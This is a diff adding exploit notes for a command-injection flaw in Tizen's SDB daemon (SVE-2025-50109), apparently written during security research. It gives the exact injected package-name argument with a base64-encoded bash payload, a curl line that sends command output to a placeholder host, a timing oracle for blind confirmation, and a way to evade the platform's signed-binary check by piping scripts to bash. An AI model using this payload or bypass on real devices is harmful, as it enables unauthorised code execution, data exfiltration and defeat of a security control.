@@ -1,0 +1,40 @@
+SDB package-name injection (SVE-2025-50109) — exact argument
+============================================================
+
+Sent as:  sdb -s 10.27.27.3:26101 shell '<ARG>'
+
+ARG (215 bytes for this example):
+
+0 appinstall tpk new2.tpk`printf${IFS}%s${IFS}L2Jpbi9ta2RpciAvdG1wL3MtMDEyMzQ1Njc4OWFiY2RlZiAyPi9kZXYvbnVsbCYmeyBjYXQgL2hvbWUvb3duZXIvc2hhcmUvdG1wL3Nka190b29scy9yZWNvbi5zaCB8IC9iaW4vYmFzaDt9|base64${IFS}-d|bash`.tpk
+
+The base64 blob decodes to:
+
+/bin/mkdir /tmp/s-0123456789abcdef 2>/dev/null&&{ cat /home/owner/share/tmp/sdk_tools/recon.sh | /bin/bash;}
+
+Notes
+-----
+* Backticks perform command substitution in the package filename.
+* ${IFS} supplies spaces (literal spaces are filtered).
+* The base64+`base64 -d|bash` stage avoids quoting/parser problems.
+* `/bin/mkdir /tmp/s-<token>` makes execution idempotent and observable.
+* Max argument length is ~510 bytes; longer commands are staged as files and
+  fetched with `cat <file> | bash`.
+* Longer commands are fetched this way:
+
+    cat <file> | /bin/bash 2>&1 | curl -s -m 15 --data-binary @- http://<HOST>:<PORT>/<tag>
+
+Timing oracle
+-------------
+The daemon replies "closed" regardless, so execution is confirmed by timing:
+
+    control : /bin/true      (fast)
+    delayed : /bin/sleep 2   (>= 1.5 s slower)
+
+Observed delta ~2.21 s on QA55QEF1AULXL (Tizen 9.0.0).
+
+UEP note
+--------
+Unsigned native files cannot be exec'd:
+    [uep][bash] the file is NOT signed!! : <path>
+Piping to the interpreter on stdin (cat file | bash) is NOT subject to that check.
+Managed code launched via the signed /usr/bin/dotnet is also not subject to it.
